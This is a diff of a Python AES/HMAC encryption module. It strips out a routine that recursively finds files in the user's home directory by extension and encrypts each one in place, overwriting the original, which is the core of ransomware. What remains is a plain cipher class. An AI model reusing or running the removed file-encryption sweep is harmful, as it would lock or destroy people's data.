@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 import os
-import mmap
-import shutil
+import base64
+import binascii
 from typing import Union
-from pathlib import Path
 from hashlib import pbkdf2_hmac
-from lib.modules.yaml import safe_load
 from hmac import new as new_hmac, compare_digest
+
 
 AES_KEY_SIZE = 16
 HMAC_KEY_SIZE = 16
@@ -60,19 +59,6 @@ r_con = (
     0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,
 )
 
-def List_Files() -> dict:
-    
-    with open('scripts/extensions.yaml', 'r') as file:
-        exts = safe_load(file)
-
-    file_categories = {category: [] for category in exts}
-    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}
-
-    for entry in Path.home().rglob('*'):
-        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
-            file_categories[extcategory[ext]].append(str(entry))
-
-    return file_categories
 
 def Sub_Bytes(s):
     """
@@ -220,14 +206,11 @@ def Split_Blocks(message, block_size=16, require_padding=True):
     return [message[i:i+16] for i in range(0, len(message), block_size)]
 
 
-class AES:
-    """
-    Lớp cài đặt mã hóa AES.
-    """
+class AESCipher:
     rounds_by_key_size = {16: 10, 24: 12, 32: 14}
     def __init__(self, master_key):
-        assert len(master_key) in AES.rounds_by_key_size
-        self.n_rounds = AES.rounds_by_key_size[len(master_key)]
+        assert len(master_key) in AESCipher.rounds_by_key_size
+        self.n_rounds = AESCipher.rounds_by_key_size[len(master_key)]
         self._key_matrices = self._expand_key(master_key)
 
     def _expand_key(self, master_key):
@@ -340,18 +323,41 @@ def get_key_iv(password, salt, workload=100000):
     iv = stretched[:IV_SIZE]
     return aes_key, hmac_key, iv
 
-def generate_key() -> bytes:
-    return os.urandom(16)
 
 
 class Fernet:
-    def __init__(self, key: bytes) -> None:
+    def __init__(self, key: Union[bytes, str]) -> None:
         self.key = key
+        try:
+            key = base64.urlsafe_b64decode(key)
+        except binascii.Error as exc:
+            raise ValueError(
+                "Fernet key must be 32 url-safe base64-encoded bytes."
+            ) from exc
+        if len(key) != 32:
+            raise ValueError(
+                "Fernet key must be 32 url-safe base64-encoded bytes."
+            )
     
-    def decrypt(self, ciphertext) -> str:
-        """
-        Giải mã một chuỗi dữ liệu bằng AES và kiểm tra chữ ký HMAC.
-        """
+    @classmethod
+    def generate_key(cls) -> bytes:
+        return base64.urlsafe_b64encode(os.urandom(32))
+    
+    def encrypt(self, plaintext: Union[bytes, str]) -> str:
+        if isinstance(self.key, str):
+            self.key = self.key.encode('utf-8')
+        if isinstance(plaintext, str):
+            plaintext = plaintext.encode('utf-8')
+
+        salt = os.urandom(SALT_SIZE)
+        key, hmac_key, iv = get_key_iv(self.key, salt)
+        ciphertext = AESCipher(key).encrypt_cbc(plaintext, iv)
+        hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
+        assert len(hmac) == HMAC_SIZE
+        
+        return hmac + salt + ciphertext
+    
+    def decrypt(self, ciphertext: Union[bytes, str]) -> str:
         if isinstance(self.key, str):
             self.key = self.key.encode('utf-8')
 
@@ -362,49 +368,4 @@ class Fernet:
         expected_hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
         assert compare_digest(hmac, expected_hmac), 'Ciphertext corrupted or tampered.'
 
-        return AES(key).decrypt_cbc(ciphertext, iv).decode()
-    
-    def encrypt(self, plaintext: Union[bytes, str]) -> str:
-        """
-        Mã hóa một chuỗi dữ liệu bằng AES và tạo chữ ký HMAC.
-        """
-        if isinstance(self.key, str):
-            self.key = self.key.encode('utf-8')
-        if isinstance(plaintext, str):
-            plaintext = plaintext.encode('utf-8')
-
-        salt = os.urandom(SALT_SIZE)
-        key, hmac_key, iv = get_key_iv(self.key, salt)
-        ciphertext = AES(key).encrypt_cbc(plaintext, iv)
-        hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
-        assert len(hmac) == HMAC_SIZE
-        
-        return hmac + salt + ciphertext
-
-
-def Process_Files(Private: Fernet, mode: str) -> None:
-    for _, files in List_Files().items():
-        for file in files:
-            temp_file = file + '.temp'
-            try:
-                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
-                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
-                        offset = 0
-                        while offset < len(mm):
-                            chunk = mm[offset:offset + 4096 * 1024]
-                            if not chunk:
-                                break
-                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
-                            temp_file.write(processed_chunk)
-                            offset += len(chunk)
-                shutil.move(temp_file.name, file)
-            except Exception:
-                if os.path.exists(temp_file.name):
-                    os.remove(temp_file.name)
-
-
-def Encrypt(Private: Fernet) -> None:
-    Process_Files(Private, 'encrypt')
-
-def Decrypt(Private: Fernet) -> None:
-    Process_Files(Private, 'decrypt')
+        return AESCipher(key).decrypt_cbc(ciphertext, iv).decode()
